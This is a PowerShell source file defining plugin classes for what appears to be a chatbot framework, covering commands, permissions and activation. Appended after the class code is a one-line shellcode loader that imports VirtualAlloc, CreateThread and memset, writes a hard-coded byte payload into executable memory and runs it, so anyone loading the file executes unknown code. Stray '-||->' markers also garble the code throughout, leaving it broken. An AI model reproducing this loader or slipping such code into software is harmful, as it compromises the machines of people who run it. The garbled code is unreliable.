



class PluginException : Exception {
     -||-> PluginException() {} <-||- 
     -||-> PluginException([string]$Message) : base($Message) {} <-||- 
}

class PluginNotFoundException : PluginException {
     -||-> PluginNotFoundException() {} <-||- 
     -||-> PluginNotFoundException([string]$Message) : base($Message) {} <-||- 
}

class PluginDisabled : PluginException {
     -||-> PluginDisabled() {} <-||- 
     -||-> PluginDisabled([string]$Message) : base($Message) {} <-||- 
}

class Plugin : BaseLogger {

    
    [string]$Name

    
    [hashtable]$Commands = @{}

    [version]$Version

    [bool]$Enabled

    [hashtable]$Permissions = @{}

    hidden [string]$_ManifestPath

     -||-> Plugin([Logger]$Logger) {
         -||-> $this.Name = $this.GetType().Name <-||- 
         -||-> $this.Logger = $Logger <-||- 
         -||-> $this.Enabled = $true <-||- 
    } <-||- 

     -||-> Plugin([string]$Name, [Logger]$Logger) {
         -||-> $this.Name = $Name <-||- 
         -||-> $this.Logger = $Logger <-||- 
         -||-> $this.Enabled = $true <-||- 
    } <-||- 

    
    [Command] -||-> FindCommand([Command]$Command) {
        return  -||-> $this.Commands.( -||-> $Command.Name <-||- ) <-||- 
    } <-||- 

    
    [void] -||-> AddCommand([Command]$Command) {
         -||-> if ( -||-> -not $this.FindCommand($Command) <-||- ) {
             -||-> $this.LogDebug("Adding command [$( -||-> $Command.Name <-||- )]") <-||- 
             -||-> $this.Commands.Add($Command.Name, $Command) <-||- 
        } <-||- 
    } <-||- 

    
    [void] -||-> RemoveCommand([Command]$Command) {
         -||-> $existingCommand = $this.FindCommand($Command) <-||- 
         -||-> if ( -||-> $existingCommand <-||- ) {
             -||-> $this.LogDebug("Removing command [$( -||-> $Command.Name <-||- )]") <-||- 
             -||-> $this.Commands.Remove($Command.Name) <-||- 
        } <-||- 
    } <-||- 

    
    [void] -||-> ActivateCommand([Command]$Command) {
         -||-> $existingCommand = $this.FindCommand($Command) <-||- 
         -||-> if ( -||-> $existingCommand <-||- ) {
             -||-> $this.LogDebug("Activating command [$( -||-> $Command.Name <-||- )]") <-||- 
             -||-> $existingCommand.Activate() <-||- 
        } <-||- 
    } <-||- 

    
    [void] -||-> DeactivateCommand([Command]$Command) {
         -||-> $existingCommand = $this.FindCommand($Command) <-||- 
         -||-> if ( -||-> $existingCommand <-||- ) {
             -||-> $this.LogDebug("Deactivating command [$( -||-> $Command.Name <-||- )]") <-||- 
             -||-> $existingCommand.Deactivate() <-||- 
        } <-||- 
    } <-||- 

    [void] -||-> AddPermission([Permission]$Permission) {
         -||-> if ( -||-> -not $this.Permissions.ContainsKey($Permission.ToString()) <-||- ) {
             -||-> $this.LogDebug("Adding permission [$Permission.ToString()] to plugin [$( -||-> $this.Name <-||- )`:$( -||-> $this.Version.ToString() <-||- )]") <-||- 
             -||-> $this.Permissions.Add($Permission.ToString(), $Permission) <-||- 
        } <-||- 
    } <-||- 

    [Permission] -||-> GetPermission([string]$Name) {
        return  -||-> $this.Permissions[$Name] <-||- 
    } <-||- 

    [void] -||-> RemovePermission([Permission]$Permission) {
         -||-> if ( -||-> $this.Permissions.ContainsKey($Permission.ToString()) <-||- ) {
             -||-> $this.LogDebug("Removing permission [$Permission.ToString()] from plugin [$( -||-> $this.Name <-||- )`:$( -||-> $this.Version.ToString() <-||- )]") <-||- 
             -||-> $this.Permissions.Remove($Permission.ToString()) <-||- 
        } <-||- 
    } <-||- 

    
    [void] -||-> Activate() {
         -||-> $this.LogDebug("Activating plugin [$( -||-> $this.Name <-||- )`:$( -||-> $this.Version.ToString() <-||- )]") <-||- 
         -||-> $this.Enabled = $true <-||- 
         -||-> $this.Commands.GetEnumerator() | ForEach-Object {
             -||-> $_.Value.Activate() <-||- 
        } <-||- 
    } <-||- 

    
    [void] -||-> Deactivate() {
         -||-> $this.LogDebug("Deactivating plugin [$( -||-> $this.Name <-||- )`:$( -||-> $this.Version.ToString() <-||- )]") <-||- 
         -||-> $this.Enabled = $false <-||- 
         -||-> $this.Commands.GetEnumerator() | ForEach-Object {
             -||-> $_.Value.Deactivate() <-||- 
        } <-||- 
    } <-||- 

    [hashtable] -||-> ToHash() {
         -||-> $cmdPerms = @{} <-||- 
         -||-> $this.Commands.GetEnumerator() | Foreach-Object {
             -||-> $cmdPerms.Add($_.Name, $_.Value.AccessFilter.Permissions.Keys) <-||- 
        } <-||- 

         -||-> $adhocPerms =  -||-> New-Object System.Collections.ArrayList <-||-  <-||- 
         -||-> $this.Permissions.GetEnumerator() | Where-Object { -||-> $_.Value.Adhoc -eq $true <-||- } | Foreach-Object {
             -||-> $adhocPerms.Add($_.Name) > $null <-||- 
        } <-||- 
        return  -||-> @{
            Name =  -||-> $this.Name <-||- 
            Version =  -||-> $this.Version.ToString() <-||- 
            Enabled =  -||-> $this.Enabled <-||- 
            ManifestPath =  -||-> $this._ManifestPath <-||- 
            CommandPermissions =  -||-> $cmdPerms <-||- 
            AdhocPermissions =  -||-> $adhocPerms <-||- 
        } <-||- 
    } <-||- 
}

 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbf,0xf4,0x7e,0xae,0x9c,0xdb,0xcf,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x7a,0x13,0x83,0xc2,0x04,0x03,0x7a,0xfb,0x9c,0x5b,0x60,0xeb,0xe3,0xa4,0x99,0xeb,0x83,0x2d,0x7c,0xda,0x83,0x4a,0xf4,0x4c,0x34,0x18,0x58,0x60,0xbf,0x4c,0x49,0xf3,0xcd,0x58,0x7e,0xb4,0x78,0xbf,0xb1,0x45,0xd0,0x83,0xd0,0xc5,0x2b,0xd0,0x32,0xf4,0xe3,0x25,0x32,0x31,0x19,0xc7,0x66,0xea,0x55,0x7a,0x97,0x9f,0x20,0x47,0x1c,0xd3,0xa5,0xcf,0xc1,0xa3,0xc4,0xfe,0x57,0xb8,0x9e,0x20,0x59,0x6d,0xab,0x68,0x41,0x72,0x96,0x23,0xfa,0x40,0x6c,0xb2,0x2a,0x99,0x8d,0x19,0x13,0x16,0x7c,0x63,0x53,0x90,0x9f,0x16,0xad,0xe3,0x22,0x21,0x6a,0x9e,0xf8,0xa4,0x69,0x38,0x8a,0x1f,0x56,0xb9,0x5f,0xf9,0x1d,0xb5,0x14,0x8d,0x7a,0xd9,0xab,0x42,0xf1,0xe5,0x20,0x65,0xd6,0x6c,0x72,0x42,0xf2,0x35,0x20,0xeb,0xa3,0x93,0x87,0x14,0xb3,0x7c,0x77,0xb1,0xbf,0x90,0x6c,0xc8,0x9d,0xfc,0x41,0xe1,0x1d,0xfc,0xcd,0x72,0x6d,0xce,0x52,0x29,0xf9,0x62,0x1a,0xf7,0xfe,0x85,0x31,0x4f,0x90,0x78,0xba,0xb0,0xb8,0xbe,0xee,0xe0,0xd2,0x17,0x8f,0x6a,0x23,0x98,0x5a,0x06,0x26,0x0e,0x37,0x86,0x16,0xb7,0xdf,0x2a,0x67,0x48,0x4e,0xa2,0x81,0x06,0xde,0xe4,0x1d,0xe6,0x8e,0x44,0xce,0x8e,0xc4,0x4a,0x31,0xae,0xe6,0x80,0x5a,0x44,0x09,0x7d,0x32,0xf0,0xb0,0x24,0xc8,0x61,0x3c,0xf3,0xb4,0xa1,0xb6,0xf0,0x49,0x6f,0x3f,0x7c,0x5a,0x07,0xcf,0xcb,0x00,0x81,0xd0,0xe1,0x2f,0x2d,0x45,0x0e,0xe6,0x7a,0xf1,0x0c,0xdf,0x4c,0x5e,0xee,0x0a,0xc7,0x57,0x7a,0xf5,0xbf,0x97,0x6a,0xf5,0x3f,0xce,0xe0,0xf5,0x57,0xb6,0x50,0xa6,0x42,0xb9,0x4c,0xda,0xdf,0x2c,0x6f,0x8b,0x8c,0xe7,0x07,0x31,0xeb,0xc0,0x87,0xca,0xde,0xd0,0xf4,0x1c,0x26,0xa7,0x14,0x9d <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



